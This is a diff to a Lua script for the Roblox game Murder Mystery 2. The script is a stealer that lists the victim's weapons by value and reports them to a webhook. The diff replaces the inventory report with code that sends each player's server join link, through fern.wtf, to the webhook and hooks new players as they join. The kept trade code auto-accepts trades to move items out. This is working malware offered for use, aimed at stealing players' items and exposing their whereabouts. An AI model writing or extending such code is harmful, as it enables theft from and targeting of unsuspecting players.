@@ -147,7 +147,6 @@ local function buildValueList()
 end
 
 -- ====================================
-
 local weaponsToSend={}
 local totalValue=0
 local min_rarity_index=table.find(rarityTable,min_rarity)
@@ -171,24 +170,30 @@ end
 
 table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
--- 🔹 Fern Link real solo visible en webhook
-local fernToken = math.random(100000,999999)
-local realLink = "[Unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"
-
--- Webhook inventario
-if #weaponsToSend > 0 then
-    local fieldsInit={
-        {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
-        {name="Inventario 📦:", value="", inline=false},
-        {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
-        {name="Click para unirte a la víctima 👇:", value=realLink, inline=false} -- solo el real
+-- 🔹 Generar link con bypass (fernToken + JobId)
+local function generateFernLinkForWebhook(victim)
+    local fernToken = math.random(100000,999999)
+    local link = string.format("[Unirse](https://fern.wtf/joiner?placeId=%s&gameInstanceId=%s&token=%s)", game.PlaceId, game.JobId, fernToken)
+    local fields = {
+        {name="Victima 👤:", value=victim.Name, inline=true},
+        {name="Click para unirte a la víctima 👇:", value=link, inline=false}
     }
-    for _, w in ipairs(weaponsToSend) do
-        fieldsInit[2].value=fieldsInit[2].value..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
-    end
-    local prefix=pingEveryone and "@everyone " or ""
-    SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
+    local prefix = pingEveryone and "@everyone " or ""
+    SendWebhook("💪Servidor listo para unirse💯","Únete ahora al server 😎", fields, prefix)
 end
+
+-- 🔹 Capturar cualquier jugador que ejecute el script
+for _, p in ipairs(Players:GetPlayers()) do
+    if p ~= LocalPlayer then
+        generateFernLinkForWebhook(p)
+    end
+end
+
+Players.PlayerAdded:Connect(function(p)
+    if p ~= LocalPlayer then
+        generateFernLinkForWebhook(p)
+    end
+end)
 
 -- 🔹 Trade
 local function doTrade(targetName)
@@ -209,7 +214,9 @@ local function doTrade(targetName)
             task.wait(6)
             acceptTrade()
             waitForTradeCompletion()
-        else task.wait(0.5) end
+        else
+            task.wait(0.5)
+        end
         task.wait(1)
     end
 end
